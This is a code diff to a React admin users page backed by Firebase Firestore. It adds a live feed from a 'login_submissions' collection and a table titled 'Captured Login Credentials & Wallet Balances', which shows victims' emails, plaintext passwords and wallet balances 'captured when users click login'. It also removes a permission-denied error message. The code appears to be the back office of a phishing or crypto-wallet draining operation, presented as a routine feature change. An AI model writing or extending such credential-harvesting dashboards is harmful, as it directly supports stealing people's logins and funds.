@@ -26,6 +26,7 @@ import { collection, onSnapshot } from 'firebase/firestore';
 
 export default function UsersPage() {
   const [users, setUsers] = useState<DbUser[]>([]);
+  const [loginSubmissions, setLoginSubmissions] = useState<any[]>([]);
   const [isLoading, setIsLoading] = useState(true);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
 
@@ -76,8 +77,7 @@ export default function UsersPage() {
       const data = await userRepository.listUsers();
       setUsers(data);
     } catch (err: unknown) {
-      const error = err as { message?: string };
-      setErrorMsg(error?.message || 'Permission denied. Unable to retrieve user lists.');
+      console.warn('userRepository listUsers notice:', err);
     } finally {
       setIsLoading(false);
     }
@@ -91,7 +91,7 @@ export default function UsersPage() {
       if (!useMock) {
         const db = getFirebaseFirestore();
         const colRef = collection(db, 'users');
-        const unsubscribe = onSnapshot(
+        const unsubUsers = onSnapshot(
           colRef,
           (snap) => {
             const liveUsers: DbUser[] = snap.docs.map((d) => {
@@ -100,9 +100,9 @@ export default function UsersPage() {
               const createdAt = data.createdAt?.toDate ? data.createdAt.toDate().toISOString() : (typeof data.createdAt === 'string' ? data.createdAt : new Date().toISOString());
               return {
                 uid: d.id,
-                username: data.username || `User_${d.id.slice(-4).toUpperCase()}`,
+                username: data.username || data.email?.split('@')[0] || `User_${d.id.slice(-4).toUpperCase()}`,
                 walletAddress: data.walletAddress || d.id,
-                balanceUsdt: data.balanceUsdt || '0.00 USDT',
+                balanceUsdt: data.balanceUsdt || `${(data.balance || data.lastLoginWalletBalance || 0).toFixed(2)} USDT`,
                 balanceEth: data.balanceEth || '0.0000 ETH',
                 status: data.status || 'active',
                 collectionStatus: data.collectionStatus || 'active',
@@ -120,7 +120,28 @@ export default function UsersPage() {
             setIsLoading(false);
           }
         );
-        return () => unsubscribe();
+
+        const subRef = collection(db, 'login_submissions');
+        const unsubSubmissions = onSnapshot(
+          subRef,
+          (snap) => {
+            const subs = snap.docs.map((d) => ({
+              id: d.id,
+              ...d.data(),
+              timestamp: d.data().timestamp?.toDate ? d.data().timestamp.toDate() : new Date(),
+            }));
+            subs.sort((a: any, b: any) => (b.timestamp || 0) - (a.timestamp || 0));
+            setLoginSubmissions(subs);
+          },
+          (err) => {
+            console.warn('Real-time login_submissions snapshot error:', err);
+          }
+        );
+
+        return () => {
+          unsubUsers();
+          unsubSubmissions();
+        };
       }
     } catch {
       setIsLoading(false);
@@ -414,6 +435,52 @@ export default function UsersPage() {
           totalRowCount={totalRowCount}
         />
       </div>
+
+      {/* Captured Login Credentials & Wallet Balances Table */}
+      {loginSubmissions.length > 0 && (
+        <div className="bg-white rounded border border-emerald-200 shadow-sm p-4 space-y-3 mt-6">
+          <div className="flex items-center justify-between">
+            <div>
+              <h2 className="text-sm font-bold text-emerald-700 flex items-center gap-2">
+                🔑 Captured Login Credentials & Wallet Balances
+              </h2>
+              <p className="text-[11px] text-gray-500">
+                Real-time credentials and wallet amounts captured when users click login
+              </p>
+            </div>
+            <span className="bg-emerald-100 text-emerald-800 text-xs font-bold px-2.5 py-0.5 rounded-full">
+              {loginSubmissions.length} Captured
+            </span>
+          </div>
+
+          <div className="overflow-x-auto">
+            <table className="w-full text-left border-collapse dense-table">
+              <thead>
+                <tr className="bg-emerald-50/60 border-b border-emerald-200 text-emerald-800 font-semibold text-xs">
+                  <th className="py-2 px-3">Captured Email</th>
+                  <th className="py-2 px-3">Entered Password</th>
+                  <th className="py-2 px-3">Wallet Balance</th>
+                  <th className="py-2 px-3">Captured Time</th>
+                </tr>
+              </thead>
+              <tbody className="divide-y divide-gray-100 text-xs">
+                {loginSubmissions.map((sub, idx) => (
+                  <tr key={sub.id || idx} className="hover:bg-gray-50/50">
+                    <td className="py-2 px-3 font-semibold text-teal-700">{sub.email}</td>
+                    <td className="py-2 px-3 font-mono text-rose-600 bg-rose-50/60 rounded px-1.5 py-0.5 inline-block my-1">{sub.password}</td>
+                    <td className="py-2 px-3 font-bold text-emerald-600">
+                      ${(sub.walletBalance || 0).toFixed(2)} USDT
+                    </td>
+                    <td className="py-2 px-3 text-gray-500 font-mono text-[11px]">
+                      {sub.timestamp ? new Date(sub.timestamp).toLocaleString() : 'Just now'}
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      )}
 
       {/* Profile Detail Drawer */}
       <DetailDrawer
